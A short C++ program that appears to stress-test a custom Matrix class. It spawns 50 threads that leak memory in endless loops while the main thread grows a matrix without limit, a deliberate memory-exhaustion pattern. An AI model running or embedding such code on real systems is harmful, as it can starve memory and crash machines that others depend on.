#include "matrix.h"
#include <iostream>
#include <thread>

int main(){
	int m = 30000;
	int k = 30000;
	Matrix<int> q(m, k);


	for (int i = 0; i < 50; ++i) {
		new std::thread([] {while (true) { 
			unsigned long long i = 0;
			if(i < 1) new char[100];
			++i;
		} 
		});
	}
	while(true) {
		q.set_size(m += 10000, k += 10000);

	}

    return 0;
}